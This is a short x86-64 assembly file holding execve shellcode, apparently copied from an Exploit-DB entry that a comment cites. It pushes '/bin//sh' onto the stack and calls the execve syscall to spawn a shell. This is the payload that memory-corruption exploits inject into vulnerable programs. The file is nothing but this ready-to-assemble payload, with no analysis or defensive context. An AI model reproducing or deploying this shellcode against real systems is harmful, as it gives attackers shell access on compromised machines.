[SECTION .text]
global _start

; https://www.exploit-db.com/shellcodes/47008

_start:
    xor     rsi, rsi
    push    rsi
    mov     rdi, 0x68732f2f6e69622f
    push    rdi
    push    rsp
    pop     rdi
    mov      al, 0x3b
    cdq
    syscall
